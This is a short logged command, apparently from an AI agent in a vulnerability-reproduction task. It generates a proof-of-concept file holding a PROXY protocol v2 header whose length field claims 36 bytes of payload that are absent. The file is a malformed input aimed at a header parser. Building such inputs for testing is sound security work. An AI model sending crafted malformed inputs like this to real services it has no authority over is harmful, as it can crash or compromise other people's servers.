Running command: python3 -c "
import struct
# Proxy protocol v2 header
sig = b'\x0D\x0A\x0D\x0A\x00\x0D\x0A\x51\x55\x49\x54\x0A'  # 12-byte signature
cmd_ver = b'\x20'  # LOCAL
fam = b'\x00'      # irrelevant for LOCAL
length = struct.pack('!H', 36)  # len = 36 in network byte order, size = 16 + 36 = 52

poc = sig + cmd_ver + fam + length
print(f'PoC length: {len(poc)} bytes')
print(f'Hex: {poc.hex()}')

with open('/workspace/poc', 'wb') as f:
    f.write(poc)
"
